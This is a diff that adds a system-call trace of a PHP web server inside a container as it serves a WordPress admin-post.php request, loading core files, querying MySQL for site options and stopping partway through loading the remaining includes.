@@ -1,0 +1,594 @@
+accept4(3, {sa_family=AF_INET, sin_port=htons(58374), sin_addr=inet_addr("192.168.0.102")}, [128->16], SOCK_CLOEXEC) = 10
+getsockname(10, {sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr("172.18.0.3")}, [128->16]) = 0
+fcntl(10, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(10, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+read(10, "GET /wp-admin/admin-post.php?swp"..., 8000) = 253
+stat("/var/www/html/wp-admin/admin-post.php", {st_mode=S_IFREG|0644, st_size=1686, ...}) = 0
+open("/var/www/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/.htaccess", O_RDONLY|O_CLOEXEC) = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=35, ...}) = 0
+read(11, "# BEGIN WordPress\n\n# END WordPre"..., 4096) = 35
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+open("/var/www/html/wp-admin/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+open("/var/www/html/wp-admin/admin-post.php/.htaccess", O_RDONLY|O_CLOEXEC) = -1 ENOTDIR (Not a directory)
+rt_sigaction(SIGPROF, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGHUP, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGINT, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGQUIT, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGTERM, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGUSR1, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+rt_sigaction(SIGUSR2, NULL, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, 8) = 0
+setitimer(ITIMER_PROF, {it_interval={tv_sec=0, tv_usec=0}, it_value={tv_sec=30, tv_usec=0}}, NULL) = 0
+rt_sigaction(SIGPROF, {sa_handler=0x7f6e73540ad0, sa_mask=~[ILL TRAP ABRT BUS FPE KILL SEGV CONT STOP TSTP TTIN TTOU SYS RTMIN RT_1], sa_flags=SA_RESTORER|SA_SIGINFO, sa_restorer=0x7f6e772d40c0}, NULL, 8) = 0
+rt_sigprocmask(SIG_UNBLOCK, [PROF], NULL, 8) = 0
+getcwd("/var/www/html", 4095)           = 14
+chdir("/var/www/html/wp-admin")         = 0
+fcntl(8, F_SETLK, {l_type=F_RDLCK, l_whence=SEEK_SET, l_start=1, l_len=1}) = 0
+lstat("/var/www/html/wp-admin/admin-post.php", {st_mode=S_IFREG|0644, st_size=1686, ...}) = 0
+lstat("/var/www/html/wp-admin", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-admin/admin-post.php", {st_mode=S_IFREG|0644, st_size=1686, ...}) = 0
+stat("/var/www/html/wp-load.php", {st_mode=S_IFREG|0644, st_size=3306, ...}) = 0
+access("/var/www/html/wp-config.php", F_OK) = 0
+stat("/var/www/html/wp-config.php", {st_mode=S_IFREG|0644, st_size=3706, ...}) = 0
+stat("/var/www/html/wp-settings.php", {st_mode=S_IFREG|0644, st_size=16246, ...}) = 0
+lstat("/var/www/html/wp-includes/load.php", {st_mode=S_IFREG|0644, st_size=33907, ...}) = 0
+lstat("/var/www/html/wp-includes", {st_mode=S_IFDIR|0755, st_size=12288, ...}) = 0
+stat("/var/www/html/wp-includes/load.php", {st_mode=S_IFREG|0644, st_size=33907, ...}) = 0
+lstat("/var/www/html/wp-includes/default-constants.php", {st_mode=S_IFREG|0644, st_size=9562, ...}) = 0
+stat("/var/www/html/wp-includes/default-constants.php", {st_mode=S_IFREG|0644, st_size=9562, ...}) = 0
+stat("/var/www/html/wp-includes/plugin.php", {st_mode=S_IFREG|0644, st_size=31677, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-hook.php", {st_mode=S_IFREG|0644, st_size=14052, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-hook.php", {st_mode=S_IFREG|0644, st_size=14052, ...}) = 0
+lstat("/var/www/html/wp-includes/version.php", {st_mode=S_IFREG|0644, st_size=619, ...}) = 0
+stat("/var/www/html/wp-includes/version.php", {st_mode=S_IFREG|0644, st_size=619, ...}) = 0
+access("/var/www/html/.maintenance", F_OK) = -1 ENOENT (No such file or directory)
+access("/var/www/html/wp-content/languages", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-includes/languages", 0x7fff0ffbfe30) = -1 ENOENT (No such file or directory)
+lstat("/var/www/html/wp-includes/compat.php", {st_mode=S_IFREG|0644, st_size=15225, ...}) = 0
+stat("/var/www/html/wp-includes/compat.php", {st_mode=S_IFREG|0644, st_size=15225, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-list-util.php", {st_mode=S_IFREG|0644, st_size=6369, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-list-util.php", {st_mode=S_IFREG|0644, st_size=6369, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.php", {st_mode=S_IFREG|0644, st_size=179915, ...}) = 0
+stat("/var/www/html/wp-includes/functions.php", {st_mode=S_IFREG|0644, st_size=179915, ...}) = 0
+lstat("/var/www/html/wp-includes/option.php", {st_mode=S_IFREG|0644, st_size=67744, ...}) = 0
+stat("/var/www/html/wp-includes/option.php", {st_mode=S_IFREG|0644, st_size=67744, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-matchesmapregex.php", {st_mode=S_IFREG|0644, st_size=1796, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-matchesmapregex.php", {st_mode=S_IFREG|0644, st_size=1796, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp.php", {st_mode=S_IFREG|0644, st_size=23753, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp.php", {st_mode=S_IFREG|0644, st_size=23753, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-error.php", {st_mode=S_IFREG|0644, st_size=4585, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-error.php", {st_mode=S_IFREG|0644, st_size=4585, ...}) = 0
+lstat("/var/www/html/wp-includes/pomo/mo.php", {st_mode=S_IFREG|0644, st_size=8462, ...}) = 0
+lstat("/var/www/html/wp-includes/pomo", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/mo.php", {st_mode=S_IFREG|0644, st_size=8462, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/translations.php", {st_mode=S_IFREG|0644, st_size=8857, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/plural-forms.php", {st_mode=S_IFREG|0644, st_size=6941, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/entry.php", {st_mode=S_IFREG|0644, st_size=2887, ...}) = 0
+stat("/var/www/html/wp-includes/pomo/streams.php", {st_mode=S_IFREG|0644, st_size=5948, ...}) = 0
+stat("/var/www/html/wp-includes/wp-db.php", {st_mode=S_IFREG|0644, st_size=99470, ...}) = 0
+access("/var/www/html/wp-content/db.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+open("/etc/hosts", O_RDONLY|O_CLOEXEC)  = 11
+fstat(11, {st_mode=S_IFREG|0644, st_size=174, ...}) = 0
+read(11, "127.0.0.1\tlocalhost\n::1\tlocalhos"..., 4096) = 174
+read(11, "", 4096)                      = 0
+close(11)                               = 0
+stat("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=38, ...}) = 0
+socket(AF_INET, SOCK_DGRAM|SOCK_NONBLOCK, IPPROTO_IP) = 11
+connect(11, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, 16) = 0
+poll([{fd=11, events=POLLOUT}], 1, 0)   = 1 ([{fd=11, revents=POLLOUT}])
+sendmmsg(11, [{msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="F\240\1\0\0\1\0\0\0\0\0\0\2db\0\0\1\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_OOB|MSG_DONTROUTE|MSG_PROBE|MSG_TRUNC|MSG_EOR|MSG_FIN|MSG_SYN|MSG_ERRQUEUE|MSG_NOSIGNAL|MSG_MORE|MSG_WAITFORONE|MSG_SENDPAGE_NOTLAST|MSG_NO_SHARED_FRAGS|MSG_ZEROCOPY|0xbf00000}, msg_len=20}, {msg_hdr={msg_name=NULL, msg_namelen=0, msg_iov=[{iov_base="o\320\1\0\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", iov_len=20}], msg_iovlen=1, msg_controllen=0, msg_flags=MSG_OOB|MSG_DONTROUTE|MSG_PROBE|MSG_TRUNC|MSG_EOR|MSG_FIN|MSG_SYN|MSG_ERRQUEUE|MSG_NOSIGNAL|MSG_MORE|MSG_WAITFORONE|MSG_SENDPAGE_NOTLAST|MSG_NO_SHARED_FRAGS|MSG_ZEROCOPY|0xbf00000}, msg_len=20}], 2, MSG_NOSIGNAL) = 2
+poll([{fd=11, events=POLLIN}], 1, 5000) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [20])               = 0
+recvfrom(11, "o\320\201\200\0\1\0\0\0\0\0\0\2db\0\0\34\0\1", 2048, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 20
+poll([{fd=11, events=POLLIN}], 1, 4999) = 1 ([{fd=11, revents=POLLIN}])
+ioctl(11, FIONREAD, [38])               = 0
+recvfrom(11, "F\240\201\200\0\1\0\1\0\0\0\0\2db\0\0\1\0\1\2db\0\0\1\0\1\0\0\2X"..., 65536, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("127.0.0.11")}, [28->16]) = 38
+close(11)                               = 0
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 11
+fcntl(11, F_GETFL)                      = 0x2 (flags O_RDWR)
+fcntl(11, F_SETFL, O_RDWR|O_NONBLOCK)   = 0
+connect(11, {sa_family=AF_INET, sin_port=htons(3306), sin_addr=inet_addr("172.18.0.2")}, 16) = -1 EINPROGRESS (Operation now in progress)
+poll([{fd=11, events=POLLIN|POLLOUT|POLLERR|POLLHUP}], 1, 60000) = 1 ([{fd=11, revents=POLLIN|POLLOUT}])
+getsockopt(11, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
+fcntl(11, F_SETFL, O_RDWR)              = 0
+setsockopt(11, SOL_TCP, TCP_NODELAY, [1], 4) = 0
+setsockopt(11, SOL_SOCKET, SO_KEEPALIVE, [1], 4) = 0
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "J\0\0\0", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\n5.7.33\0\30\0\0\0Oz~[i>\\)\0\377\377\10\2\0\377\301\25\0\0\0"..., 78, MSG_DONTWAIT, NULL, NULL) = 74
+sendto(11, "l\0\0\1\215\242\n\0\0\0\0\300\10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 112, MSG_DONTWAIT, NULL, 0) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\2", 4, MSG_DONTWAIT, NULL, NULL) = 4
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0\0\2\0\0\0", 78, MSG_DONTWAIT, NULL, NULL) = 7
+sendto(11, "\22\0\0\0\3SET NAMES utf8mb4", 22, MSG_DONTWAIT, NULL, 0) = 22
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 71, MSG_DONTWAIT, NULL, NULL) = 11
+getpid()                                = 67
+sendto(11, "5\0\0\0\3SET NAMES 'utf8mb4' COLLATE"..., 57, MSG_DONTWAIT, NULL, 0) = 57
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\0\0", 60, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\32\0\0\0\3SELECT @@SESSION.sql_mode", 30, MSG_DONTWAIT, NULL, 0) = 30
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\1(\0\0\2\3def\0\0\0\22@@SESSION.sql_m"..., 49, MSG_DONTWAIT, NULL, NULL) = 49
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\5\0\0\3\376\0\0\2\0\212\0\0\4\211ONLY_FULL_GROUP_BY"..., 78, MSG_DONTWAIT, NULL, NULL) = 78
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ATE,ERROR_FOR_DIVISION_BY_ZERO,N"..., 216, MSG_DONTWAIT, NULL, NULL) = 82
+sendto(11, "m\0\0\0\3SET SESSION sql_mode='NO_ZE"..., 113, MSG_DONTWAIT, NULL, 0) = 113
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 134, MSG_DONTWAIT, NULL, NULL) = 11
+sendto(11, "\n\0\0\0\2wordpress", 14, MSG_DONTWAIT, NULL, 0) = 14
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\7\0\0\1\0\0\0\2\0\1\0", 123, MSG_DONTWAIT, NULL, NULL) = 11
+access("/var/www/html/wp-content/object-cache.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-includes/cache.php", {st_mode=S_IFREG|0644, st_size=21601, ...}) = 0
+lstat("/var/www/html/wp-includes/default-filters.php", {st_mode=S_IFREG|0644, st_size=26196, ...}) = 0
+stat("/var/www/html/wp-includes/default-filters.php", {st_mode=S_IFREG|0644, st_size=26196, ...}) = 0
+stat("/var/www/html/wp-includes/l10n.php", {st_mode=S_IFREG|0644, st_size=43479, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-locale.php", {st_mode=S_IFREG|0644, st_size=14547, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-locale-switcher.php", {st_mode=S_IFREG|0644, st_size=5059, ...}) = 0
+sendto(11, "H\0\0\0\3SELECT option_name, option_"..., 76, MSG_DONTWAIT, NULL, 0) = 76
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\1\0\0\1\2I\0\0\2\3def\twordpress\nwp_optio"..., 112, MSG_DONTWAIT, NULL, NULL) = 112
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "wp_options\foption_value\foption_v"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_can_register\0010\34\0\0\n\vadmin_email\17"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "ail.example.com#\0\0\23\20mailserver_l"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "g\0\22\0\0\32\16posts_per_page\00210\23\0\0\33\vdat"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "e\0010\23\0\0#\fblog_charset\5UTF-8j\0\0$\16a"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nks\00250\16\0\0(\ngmt_offset\2-3\31\0\0)\26def"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "lt_role\nsubscriber\21\0\0001\ndb_versio"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\0\0:\17upload_url_path\0\25\0\0;\20thumbna"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_default_link_type\4none\24\0\0D\22imag"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "nts_per_page\00250\35\0\0L\25default_comm"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "_multiwidget\";i:1;}5\0\0P\vwidget_t"..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "at\0010\27\0\0V\24link_manager_enabled\0010\""..., 216, MSG_DONTWAIT, NULL, NULL) = 216
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":2:{s:4:\"name\";s:13:\"Administrat"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, ":\"number\";i:5;}s:12:\"_multiwidge"..., 3366, MSG_DONTWAIT, NULL, NULL) = 3366
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "=\"swp-component-cta\" href=\"https"..., 9072, MSG_DONTWAIT, NULL, NULL) = 9072
+poll([{fd=11, events=POLLIN|POLLERR|POLLHUP}], 1, 86400000) = 1 ([{fd=11, revents=POLLIN}])
+recvfrom(11, "\";s:6:\"values\";a:4:{s:5:\"above\";"..., 9072, MSG_DONTWAIT, NULL, NULL) = 3204
+lstat("/var/www/html/wp-includes/class-wp-walker.php", {st_mode=S_IFREG|0644, st_size=12378, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-walker.php", {st_mode=S_IFREG|0644, st_size=12378, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-ajax-response.php", {st_mode=S_IFREG|0644, st_size=5024, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-ajax-response.php", {st_mode=S_IFREG|0644, st_size=5024, ...}) = 0
+lstat("/var/www/html/wp-includes/formatting.php", {st_mode=S_IFREG|0644, st_size=265348, ...}) = 0
+stat("/var/www/html/wp-includes/formatting.php", {st_mode=S_IFREG|0644, st_size=265348, ...}) = 0
+lstat("/var/www/html/wp-includes/capabilities.php", {st_mode=S_IFREG|0644, st_size=27288, ...}) = 0
+stat("/var/www/html/wp-includes/capabilities.php", {st_mode=S_IFREG|0644, st_size=27288, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-roles.php", {st_mode=S_IFREG|0644, st_size=8187, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-roles.php", {st_mode=S_IFREG|0644, st_size=8187, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-role.php", {st_mode=S_IFREG|0644, st_size=2614, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-role.php", {st_mode=S_IFREG|0644, st_size=2614, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user.php", {st_mode=S_IFREG|0644, st_size=20679, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user.php", {st_mode=S_IFREG|0644, st_size=20679, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-query.php", {st_mode=S_IFREG|0644, st_size=123798, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-query.php", {st_mode=S_IFREG|0644, st_size=123798, ...}) = 0
+lstat("/var/www/html/wp-includes/query.php", {st_mode=S_IFREG|0644, st_size=23472, ...}) = 0
+stat("/var/www/html/wp-includes/query.php", {st_mode=S_IFREG|0644, st_size=23472, ...}) = 0
+lstat("/var/www/html/wp-includes/date.php", {st_mode=S_IFREG|0644, st_size=35000, ...}) = 0
+stat("/var/www/html/wp-includes/date.php", {st_mode=S_IFREG|0644, st_size=35000, ...}) = 0
+lstat("/var/www/html/wp-includes/theme.php", {st_mode=S_IFREG|0644, st_size=99731, ...}) = 0
+stat("/var/www/html/wp-includes/theme.php", {st_mode=S_IFREG|0644, st_size=99731, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-theme.php", {st_mode=S_IFREG|0644, st_size=47257, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-theme.php", {st_mode=S_IFREG|0644, st_size=47257, ...}) = 0
+lstat("/var/www/html/wp-includes/template.php", {st_mode=S_IFREG|0644, st_size=19792, ...}) = 0
+stat("/var/www/html/wp-includes/template.php", {st_mode=S_IFREG|0644, st_size=19792, ...}) = 0
+lstat("/var/www/html/wp-includes/user.php", {st_mode=S_IFREG|0644, st_size=93308, ...}) = 0
+stat("/var/www/html/wp-includes/user.php", {st_mode=S_IFREG|0644, st_size=93308, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user-query.php", {st_mode=S_IFREG|0644, st_size=29525, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user-query.php", {st_mode=S_IFREG|0644, st_size=29525, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-session-tokens.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-session-tokens.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-user-meta-session-tokens.php", {st_mode=S_IFREG|0644, st_size=2916, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-user-meta-session-tokens.php", {st_mode=S_IFREG|0644, st_size=2916, ...}) = 0
+lstat("/var/www/html/wp-includes/meta.php", {st_mode=S_IFREG|0644, st_size=37476, ...}) = 0
+stat("/var/www/html/wp-includes/meta.php", {st_mode=S_IFREG|0644, st_size=37476, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-meta-query.php", {st_mode=S_IFREG|0644, st_size=22254, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-meta-query.php", {st_mode=S_IFREG|0644, st_size=22254, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-metadata-lazyloader.php", {st_mode=S_IFREG|0644, st_size=5372, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-metadata-lazyloader.php", {st_mode=S_IFREG|0644, st_size=5372, ...}) = 0
+lstat("/var/www/html/wp-includes/general-template.php", {st_mode=S_IFREG|0644, st_size=138839, ...}) = 0
+stat("/var/www/html/wp-includes/general-template.php", {st_mode=S_IFREG|0644, st_size=138839, ...}) = 0
+lstat("/var/www/html/wp-includes/link-template.php", {st_mode=S_IFREG|0644, st_size=133881, ...}) = 0
+stat("/var/www/html/wp-includes/link-template.php", {st_mode=S_IFREG|0644, st_size=133881, ...}) = 0
+lstat("/var/www/html/wp-includes/author-template.php", {st_mode=S_IFREG|0644, st_size=16123, ...}) = 0
+stat("/var/www/html/wp-includes/author-template.php", {st_mode=S_IFREG|0644, st_size=16123, ...}) = 0
+lstat("/var/www/html/wp-includes/post.php", {st_mode=S_IFREG|0644, st_size=213927, ...}) = 0
+stat("/var/www/html/wp-includes/post.php", {st_mode=S_IFREG|0644, st_size=213927, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-page.php", {st_mode=S_IFREG|0644, st_size=6713, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-page.php", {st_mode=S_IFREG|0644, st_size=6713, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-page-dropdown.php", {st_mode=S_IFREG|0644, st_size=2279, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-page-dropdown.php", {st_mode=S_IFREG|0644, st_size=2279, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-post-type.php", {st_mode=S_IFREG|0644, st_size=18236, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-post-type.php", {st_mode=S_IFREG|0644, st_size=18236, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-post.php", {st_mode=S_IFREG|0644, st_size=6355, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-post.php", {st_mode=S_IFREG|0644, st_size=6355, ...}) = 0
+lstat("/var/www/html/wp-includes/post-template.php", {st_mode=S_IFREG|0644, st_size=58725, ...}) = 0
+stat("/var/www/html/wp-includes/post-template.php", {st_mode=S_IFREG|0644, st_size=58725, ...}) = 0
+lstat("/var/www/html/wp-includes/revision.php", {st_mode=S_IFREG|0644, st_size=21305, ...}) = 0
+stat("/var/www/html/wp-includes/revision.php", {st_mode=S_IFREG|0644, st_size=21305, ...}) = 0
+lstat("/var/www/html/wp-includes/post-formats.php", {st_mode=S_IFREG|0644, st_size=6976, ...}) = 0
+stat("/var/www/html/wp-includes/post-formats.php", {st_mode=S_IFREG|0644, st_size=6976, ...}) = 0
+lstat("/var/www/html/wp-includes/post-thumbnail-template.php", {st_mode=S_IFREG|0644, st_size=8216, ...}) = 0
+stat("/var/www/html/wp-includes/post-thumbnail-template.php", {st_mode=S_IFREG|0644, st_size=8216, ...}) = 0
+lstat("/var/www/html/wp-includes/category.php", {st_mode=S_IFREG|0644, st_size=11984, ...}) = 0
+stat("/var/www/html/wp-includes/category.php", {st_mode=S_IFREG|0644, st_size=11984, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-category.php", {st_mode=S_IFREG|0644, st_size=6641, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-category.php", {st_mode=S_IFREG|0644, st_size=6641, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-category-dropdown.php", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-category-dropdown.php", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
+lstat("/var/www/html/wp-includes/category-template.php", {st_mode=S_IFREG|0644, st_size=51324, ...}) = 0
+stat("/var/www/html/wp-includes/category-template.php", {st_mode=S_IFREG|0644, st_size=51324, ...}) = 0
+lstat("/var/www/html/wp-includes/comment.php", {st_mode=S_IFREG|0644, st_size=104343, ...}) = 0
+stat("/var/www/html/wp-includes/comment.php", {st_mode=S_IFREG|0644, st_size=104343, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-comment.php", {st_mode=S_IFREG|0644, st_size=8936, ...}) = 0
